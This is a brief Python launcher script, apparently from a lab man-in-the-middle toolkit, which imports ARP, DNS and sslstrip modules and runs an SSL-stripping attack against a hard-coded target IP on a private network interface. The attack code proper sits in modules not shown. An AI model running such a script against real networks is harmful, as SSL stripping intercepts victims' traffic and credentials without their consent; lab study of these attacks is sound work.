from arp import *
from dns import *
from sslstrip import *
from GUI import *
import time

TARGET_IP = "10.0.2.5"
SPOOFED_IP = "10.0.2.6"
IFACE = "enp0s8"

ssl = sslstrip(TARGET_IP, IFACE)
ssl.strip()

#GUI()
